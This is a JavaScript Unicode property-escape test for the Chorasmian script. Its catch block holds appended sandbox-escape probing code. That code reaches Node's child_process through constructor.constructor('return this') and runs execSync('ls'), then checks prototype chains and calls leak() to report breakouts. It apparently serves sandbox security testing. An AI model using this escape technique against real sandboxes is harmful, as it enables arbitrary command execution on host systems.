try {
    const matchSymbols = buildString({
        loneCodePoints: [],
        ranges: [[
                69552,
                69579
            ]]
    });
    testPropertyEscapes(/^\p{Script_Extensions=Chorasmian}+$/u, matchSymbols, '\\p{Script_Extensions=Chorasmian}');
    testPropertyEscapes(/^\p{Script_Extensions=Chrs}+$/u, matchSymbols, '\\p{Script_Extensions=Chrs}');
    testPropertyEscapes(/^\p{scx=Chorasmian}+$/u, matchSymbols, '\\p{scx=Chorasmian}');
    testPropertyEscapes(/^\p{scx=Chrs}+$/u, matchSymbols, '\\p{scx=Chrs}');
    const nonMatchSymbols = buildString({
        loneCodePoints: [],
        ranges: [
            [
                56320,
                57343
            ],
            [
                0,
                56319
            ],
            [
                57344,
                69551
            ],
            [
                69580,
                1114111
            ]
        ]
    });
    testPropertyEscapes(/^\P{Script_Extensions=Chorasmian}+$/u, nonMatchSymbols, '\\P{Script_Extensions=Chorasmian}');
    testPropertyEscapes(/^\P{Script_Extensions=Chrs}+$/u, nonMatchSymbols, '\\P{Script_Extensions=Chrs}');
    testPropertyEscapes(/^\P{scx=Chorasmian}+$/u, nonMatchSymbols, '\\P{scx=Chorasmian}');
    testPropertyEscapes(/^\P{scx=Chrs}+$/u, nonMatchSymbols, '\\P{scx=Chrs}');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}